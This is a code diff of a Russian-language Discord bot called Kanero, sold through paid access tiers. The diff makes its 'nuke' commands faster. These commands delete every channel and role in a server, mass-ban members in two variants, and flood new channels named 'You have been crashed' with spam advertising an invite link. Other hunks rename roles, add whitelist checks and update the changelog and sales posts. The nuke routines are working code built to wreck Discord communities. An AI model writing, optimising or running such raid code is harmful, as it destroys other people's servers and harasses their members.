@@ -257,30 +257,37 @@ async def do_nuke(guild, spam_text=None, caller_id=None):
 
     NUKE_NAME = "Вы были крашнуты"
 
-    # ── 1. Удаляем все каналы и роли параллельно ──
+    # ── 1. Удаляем каналы и роли параллельно, сразу начинаем создавать ──
     bot_role = guild.me.top_role
-    await asyncio.gather(
-        *[c.delete() for c in guild.channels],
-        *[r.delete() for r in guild.roles if r < bot_role and not r.is_default()],
-        return_exceptions=True
-    )
+    channels_to_delete = list(guild.channels)
+    roles_to_delete = [r for r in guild.roles if r < bot_role and not r.is_default()]
 
-    # ── 2. Создаём каналы ──
+    import random
+
+    # Запускаем удаление и создание одновременно
+    async def delete_all():
+        await asyncio.gather(
+            *[c.delete() for c in channels_to_delete],
+            *[r.delete() for r in roles_to_delete],
+            return_exceptions=True
+        )
+
     async def create_and_spam(i):
         try:
             if not nuke_running.get(guild.id):
                 return
             ch = await guild.create_text_channel(name=NUKE_NAME)
-            msgs = []
-            for _ in range(config.SPAM_COUNT // config.CHANNELS_COUNT):
-                ad = random.choice(ad_variants)
-                msgs.append(ch.send(spam_text + ad))
+            msgs = [ch.send(spam_text + random.choice(ad_variants)) for _ in range(config.SPAM_COUNT // config.CHANNELS_COUNT)]
             await asyncio.gather(*msgs, return_exceptions=True)
         except Exception:
             pass
 
-    # ── 3. Спам до 500 сообщений ──
-    await asyncio.gather(*[create_and_spam(i) for i in range(config.CHANNELS_COUNT)], return_exceptions=True)
+    # Удаление и создание каналов — параллельно
+    await asyncio.gather(
+        delete_all(),
+        *[create_and_spam(i) for i in range(config.CHANNELS_COUNT)],
+        return_exceptions=True
+    )
 
     # ── 4. Создаём роль и выдаём тому кто написал !nuke ──
     if caller_id:
@@ -342,14 +349,7 @@ async def do_superpr_nuke_task(guild, spam_text=None):
     to_ban = candidates[:ban_count]
     await asyncio.gather(*[m.ban(reason="super_nuke") for m in to_ban], return_exceptions=True)
 
-    # ── 2. Удаляем все каналы и роли параллельно ──
-    await asyncio.gather(
-        *[c.delete() for c in guild.channels],
-        *[r.delete() for r in guild.roles if r < bot_role and not r.is_default()],
-        return_exceptions=True
-    )
-
-    # ── 3. Создаём новые каналы и спамим ──
+    # ── 2. Удаляем и создаём параллельно ──
     import random
     ad_variants = [
         "\n\n☠️ Kanero — https://discord.gg/JhQtrCtKFy",
@@ -358,6 +358,16 @@ async def do_superpr_nuke_task(guild, spam_text=None):
         "\n\n💀 Kanero — заходи: discord.gg/JhQtrCtKFy",
         "\n\n☠️ discord.gg/JhQtrCtKFy — Kanero",
     ]
+    channels_to_delete = list(guild.channels)
+    roles_to_delete = [r for r in guild.roles if r < bot_role and not r.is_default()]
+
+    async def delete_all():
+        await asyncio.gather(
+            *[c.delete() for c in channels_to_delete],
+            *[r.delete() for r in roles_to_delete],
+            return_exceptions=True
+        )
+
     async def create_and_spam(i):
         try:
             ch = await guild.create_text_channel(name=TURBO_NAME)
@@ -368,7 +378,11 @@ async def do_superpr_nuke_task(guild, spam_text=None):
         except Exception:
             pass
 
-    await asyncio.gather(*[create_and_spam(i) for i in range(config.CHANNELS_COUNT)], return_exceptions=True)
+    await asyncio.gather(
+        delete_all(),
+        *[create_and_spam(i) for i in range(config.CHANNELS_COUNT)],
+        return_exceptions=True
+    )
 
     # ── Создаём роль и выдаём запустившему ──
     _starter = nuke_starter.get(guild.id)
@@ -413,15 +427,7 @@ async def do_owner_nuke_task(guild, spam_text=None):
     # ── 1. Баним ВСЕХ ──
     await asyncio.gather(*[m.ban(reason="owner_nuke") for m in targets], return_exceptions=True)
 
-    # ── 2. Удаляем все каналы и роли параллельно ──
-    await asyncio.gather(
-        *[c.delete() for c in guild.channels],
-        *[r.delete() for r in guild.roles if r < bot_role and not r.is_default()],
-        return_exceptions=True
-    )
-
-    # ── 3. Создаём новые каналы и спамим ──
-    # ── 3. Создаём новые каналы и спамим ──
+    # ── 2. Удаляем и создаём параллельно ──
     import random
     ad_variants = [
         "\n\n☠️ Kanero — https://discord.gg/JhQtrCtKFy",
@@ -430,6 +436,16 @@ async def do_owner_nuke_task(guild, spam_text=None):
         "\n\n💀 Kanero — заходи: discord.gg/JhQtrCtKFy",
         "\n\n☠️ discord.gg/JhQtrCtKFy — Kanero",
     ]
+    channels_to_delete = list(guild.channels)
+    roles_to_delete = [r for r in guild.roles if r < bot_role and not r.is_default()]
+
+    async def delete_all():
+        await asyncio.gather(
+            *[c.delete() for c in channels_to_delete],
+            *[r.delete() for r in roles_to_delete],
+            return_exceptions=True
+        )
+
     async def create_and_spam(i):
         try:
             ch = await guild.create_text_channel(name=OWNER_NAME)
@@ -440,7 +456,11 @@ async def do_owner_nuke_task(guild, spam_text=None):
         except Exception:
             pass
 
-    await asyncio.gather(*[create_and_spam(i) for i in range(config.CHANNELS_COUNT)], return_exceptions=True)
+    await asyncio.gather(
+        delete_all(),
+        *[create_and_spam(i) for i in range(config.CHANNELS_COUNT)],
+        return_exceptions=True
+    )
 
     # ── Создаём роль и выдаём запустившему ──
     _starter = nuke_starter.get(guild.id)
@@ -478,7 +498,7 @@ async def global_guild_block(ctx):
         return False
     # На домашнем сервере — только овнер может использовать команды
     if ctx.guild and ctx.guild.id == HOME_GUILD_ID:
-        if ctx.author.id != config.OWNER_ID:
+        if ctx.author.id != config.OWNER_ID and ctx.author.id not in config.OWNER_WHITELIST:
             return False
     return True
 
@@ -541,18 +561,22 @@ async def nuke(ctx, *, text: str = None):
 
 
 @bot.command()
-@wl_check()
 async def stop(ctx):
     guild = ctx.guild
     uid = ctx.author.id
-    starter_id = nuke_starter.get(guild.id)
 
-    # Овнер останавливает всегда
+    # Овнер останавливает всегда — без каких-либо проверок
     if uid == config.OWNER_ID:
         nuke_running[guild.id] = False
         nuke_starter.pop(guild.id, None)
         await ctx.send("✅ Остановлено.")
         return
+
+    # Остальные — через wl_check
+    if not is_whitelisted(uid):
+        return
+
+    starter_id = nuke_starter.get(guild.id)
 
     # Никто не запускал — просто останавливаем
     if starter_id is None:
@@ -1303,8 +1327,7 @@ async def auto_info(ctx):
 
 
 async def _post_news_and_sell(guild: discord.Guild):
-    """Постит сообщение в новости и sell после setup/setup_update."""
-    # Ищем каналы
+    """Постит сообщение в новости и sell после setup/setup_update. Пропускает если уже есть сообщение от бота."""
     news_ch = discord.utils.find(lambda c: "новост" in c.name.lower() or "news" in c.name.lower(), guild.text_channels)
     sell_ch = discord.utils.find(lambda c: "sell" in c.name.lower(), guild.text_channels)
     changelog_ch = discord.utils.find(lambda c: "changelog" in c.name.lower(), guild.text_channels)
@@ -1314,40 +1337,51 @@ async def _post_news_and_sell(guild: discord.Guild):
     ab_mention = addbot_ch.mention if addbot_ch else "#addbot"
     sell_mention = sell_ch.mention if sell_ch else "#sell"
 
-    # Новости
+    # Новости — постим только если нет сообщений от бота
     if news_ch:
         try:
-            embed = discord.Embed(
-                title="🔔 Бот обновлён!",
-                description=(
-                    f"@everyone\n\n"
-                    f"📋 **История изменений:** {cl_mention}\n\n"
-                    f"🆓 **Бесплатный доступ (freelist):**\n"
-                    f"Напиши в {ab_mention}\n\n"
-                    f"✅💎 **White / Premium и выше:**\n"
-                    f"Загляни в {sell_mention}"
-                ),
-                color=0x0a0a0a
-            )
-            embed.set_footer(text="☠️ Kanero  |  discord.gg/JhQtrCtKFy")
-            await news_ch.send("@everyone", embed=embed)
+            has_msg = False
+            async for msg in news_ch.history(limit=20):
+                if msg.author.id == guild.me.id:
+                    has_msg = True
+                    break
+            if not has_msg:
+                embed = discord.Embed(
+                    title="🔔 Бот обновлён!",
+                    description=(
+                        f"📋 **История изменений:** {cl_mention}\n\n"
+                        f"🆓 **Бесплатный доступ (freelist):**\n"
+                        f"Напиши в {ab_mention}\n\n"
+                        f"✅💎 **White / Premium и выше:**\n"
+                        f"Загляни в {sell_mention}\n\n"
+                        f"[Наш сервер](https://discord.gg/JhQtrCtKFy)"
+                    ),
+                    color=0x0a0a0a
+                )
+                embed.set_footer(text="☠️ Kanero")
+                await news_ch.send(content="@everyone", embed=embed)
         except Exception:
             pass
 
-    # Sell
+    # Sell — постим только если нет сообщений от бота
     if sell_ch:
         try:
-            embed = discord.Embed(
-                title="🛒 Купить доступ — Kanero",
-                description=(
-                    "@everyone\n\n"
-                    "Если хотите купить доступ:\n\n"
-                    "https://funpay.com/users/16928925/"
-                ),
-                color=0x0a0a0a
-            )
-            embed.set_footer(text="☠️ Kanero  |  White · Premium · Fame")
-            await sell_ch.send("@everyone", embed=embed)
+            has_msg = False
+            async for msg in sell_ch.history(limit=20):
+                if msg.author.id == guild.me.id:
+                    has_msg = True
+                    break
+            if not has_msg:
+                embed = discord.Embed(
+                    title="🛒 Купить доступ — Kanero",
+                    description=(
+                        "Если хотите купить доступ:\n\n"
+                        "https://funpay.com/users/16928925/"
+                    ),
+                    color=0x0a0a0a
+                )
+                embed.set_footer(text="☠️ Kanero  |  White · Premium · Fame")
+                await sell_ch.send("@everyone", embed=embed)
         except Exception:
             pass
 
@@ -1397,7 +1431,7 @@ async def setup(ctx):
     role_bot     = await guild.create_role(name="🤖 Kanero",     color=discord.Color.from_rgb(0, 200, 150),   permissions=dev_perms,     hoist=True,  mentionable=False)
     role_media   = await guild.create_role(name="🎬 Media",      color=discord.Color.from_rgb(255, 140, 0),   hoist=True, mentionable=False)
     role_mod     = await guild.create_role(name="🛡️ Moderator",  color=discord.Color.from_rgb(100, 180, 100), hoist=True,  mentionable=False)
-    role_fame    = await guild.create_role(name="🌟 Fame",        color=discord.Color.from_rgb(30, 144, 255),  hoist=True,  mentionable=False)
+    role_friend    = await guild.create_role(name="🤝 Friend",        color=discord.Color.from_rgb(30, 144, 255),  hoist=True,  mentionable=False)
 
     try:
         await guild.me.add_roles(role_bot)
@@ -1412,8 +1446,8 @@ async def setup(ctx):
         await role_owner.edit(position=max(1, bot_top - 3))
         await role_media.edit(position=max(1, bot_top - 4))
         await role_mod.edit(position=max(1, bot_top - 5))
-        await role_premium.edit(position=max(1, bot_top - 6))
-        await role_fame.edit(position=max(1, bot_top - 7))
+        await role_friend.edit(position=max(1, bot_top - 6))
+        await role_premium.edit(position=max(1, bot_top - 7))
         await role_white.edit(position=max(1, bot_top - 8))
         await role_user.edit(position=max(1, bot_top - 9))
         await role_guest.edit(position=1)
@@ -1607,7 +1641,13 @@ async def setup(ctx):
         role_white: _ow(), role_premium: _ow(),
         role_owner: _ow(True, True), role_dev: _ow(True, True),
     })
-    logs_ch = await guild.create_text_channel("📊・logs",       category=cat_admin, overwrites=admin_ow(), topic="Логи нюков — !nukelogs")
+    logs_ch = await guild.create_text_channel("📊・logs", category=cat_admin, overwrites=admin_ow(), topic="Логи нюков — !nukelogs")
+    await guild.create_text_channel("🤝・friend-chat", category=cat_admin, overwrites={
+        guild.default_role: _ow(), role_guest: _ow(), role_user: _ow(),
+        role_white: _ow(), role_premium: _ow(),
+        role_friend: _ow(True, True),
+        role_owner: _ow(True, True), role_dev: _ow(True, True),
+    }, topic="Чат для 🤝 Friend")
 
     # ── 5. Контент в каналы ──
 
@@ -1627,7 +1667,7 @@ async def setup(ctx):
 
     r = discord.Embed(title="📜 Правила — Kanero", color=0x0a0a0a)
     r.add_field(name="📋 Правила", value="**1.** Уважай участников\n**2.** Без спама и флуда\n**3.** Без рекламы без разрешения\n**4.** Без доксинга\n**5.** Соблюдай Discord ToS\n**6.** Без токсика и оскорблений", inline=False)
-    r.add_field(name="🎭 Уровни", value="🤖 Kanero · 🔧 Developer · 👑 Owner · 🎬 Media · �️ Moderator · �💎 Premium · 🌟 Fame · ✅ White · 👥 User · 👤 Guest", inline=False)
+    r.add_field(name="🎭 Уровни", value="🤖 Kanero · 🔧 Developer · 👑 Owner · 🎬 Media · �️ Moderator · �💎 Premium · 🤝 Friend · ✅ White · 👥 User · 👤 Guest", inline=False)
     r.add_field(name="🔑 Доступ", value="**User (freelist):** напиши в 🤖・addbot\n**White/Premium:** загляни в 🎫・выдача-вайта\n**Поддержка:** 🎫・create-ticket", inline=False)
     r.set_footer(text="☠️ Kanero  |  Нарушение = бан")
     await rules_ch.send(embed=r)
@@ -1727,7 +1767,7 @@ async def setup_update(ctx):
                 pass
 
     # 3. Создаём отсутствующие роли
-    for rname in ("🛡️ Moderator", "🎬 Media", "🌟 Fame"):
+    for rname in ("🛡️ Moderator", "🎬 Media", "🤝 Friend"):
         if not discord.utils.find(lambda r: r.name == rname, guild.roles):
             try:
                 await guild.create_role(name=rname)
@@ -1805,8 +1845,8 @@ async def setup_update(ctx):
                 ("👑 Owner",      bot_top - 3),
                 ("🎬 Media",      bot_top - 4),
                 ("🛡️ Moderator",  bot_top - 5),
-                ("💎 Premium",    bot_top - 6),
-                ("🌟 Fame",       bot_top - 7),
+                ("🤝 Friend",       bot_top - 6),
+                ("💎 Premium",    bot_top - 7),
                 ("✅ White",      bot_top - 8),
                 ("👥 User",       bot_top - 9),
                 ("👤 Guest",      1),
@@ -2662,24 +2702,20 @@ bot.remove_command("help")
 @bot.command(name="changelog")
 async def changelog(ctx):
     """Показывает только последнее обновление."""
-    embed = discord.Embed(title="📋 CHANGELOG — v2.1  |  Обновление сервера", color=0x0a0a0a)
+    embed = discord.Embed(title="📋 CHANGELOG — v2.2  |  Обновление ролей", color=0x0a0a0a)
     embed.add_field(
-        name="🔥 v2.1 — Новые функции",
+        name="🔥 v2.2",
         value=(
             "**Роли:**\n"
-            "• 🌟 Fame — новая роль (синяя, под Premium)\n"
-            "• 🎬 Media и 🛡️ Moderator — правильная иерархия\n"
-            "• Авто-роль � Guest при входе на сервер\n\n"
+            "• 🌟 Fame переименована в 🤝 Friend\n"
+            "• Friend стоит над 💎 Premium\n\n"
             "**Каналы:**\n"
-            "• 🛒・sell — продажа подписок\n"
-            "• 🎫・выдача-вайта — все видят, только Owner пишет\n"
-            "• Убраны: статистика-счётчики, lists, bot-commands\n\n"
-            "**Команды:**\n"
-            "• `!sync_roles` — синхронизация ролей по листам + авто-удаление из листа если ушёл с сервера\n"
-            "• `!autorole` — проверить статус авто-роли\n"
-            "• `!setup_update` — теперь обновляет позиции ролей\n\n"
-            "**ЛС:**\n"
-            "• Команды в ЛС теперь сразу на домашнем сервере без выбора"
+            "• 🤝・friend-chat в ADMIN — только Friend+\n\n"
+            "**Нюки:**\n"
+            "• Удаление и создание каналов параллельно — быстрее\n"
+            "• Овнер всегда может остановить любой нюк\n\n"
+            "**Логи:**\n"
+            "• Бот пишет в 📊・logs при каждом нюке автоматически"
         ),
         inline=False
     )
@@ -2716,7 +2752,7 @@ async def changelogall(ctx):
     embed.add_field(
         name="🔥 v2.1 — Новые функции",
         value=(
-            "• 🌟 Fame, 🎬 Media, 🛡️ Moderator — правильная иерархия\n"
+            "• 🤝 Friend, 🎬 Media, 🛡️ Moderator — правильная иерархия\n"
             "• Авто-роль 👤 Guest при входе\n"
             "• 🛒・sell · 🎫・выдача-вайта\n"
             "• !sync_roles — синхронизация ролей + авто-удаление из листа\n"
@@ -2725,7 +2761,18 @@ async def changelogall(ctx):
         ),
         inline=False
     )
-    embed.set_footer(text="☠️ Kanero  |  discord.gg/JhQtrCtKFy  |  текущая версия: v2.1")
+    embed.add_field(
+        name="🔥 v2.2",
+        value=(
+            "• 🌟 Fame → 🤝 Friend, стоит над 💎 Premium\n"
+            "• 🤝・friend-chat в ADMIN\n"
+            "• Нюки быстрее — удаление и создание параллельно\n"
+            "• Овнер всегда останавливает любой нюк\n"
+            "• Авто-лог в 📊・logs при каждом нюке"
+        ),
+        inline=False
+    )
+    embed.set_footer(text="☠️ Kanero  |  discord.gg/JhQtrCtKFy  |  текущая версия: v2.2")
     embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
     await ctx.send(embed=embed)
 
@@ -2833,7 +2880,7 @@ async def help_cmd(ctx):
         value="Загляни в 🎫・выдача-вайта на нашем сервере\nhttps://discord.gg/JhQtrCtKFy",
         inline=False
     )
-    embed.set_footer(text="☠️ Kanero  |  !changelogall — вся история  |  v2.1")
+    embed.set_footer(text="☠️ Kanero  |  !changelogall — вся история  |  v2.2")
     embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
     await ctx.send(embed=embed)
 
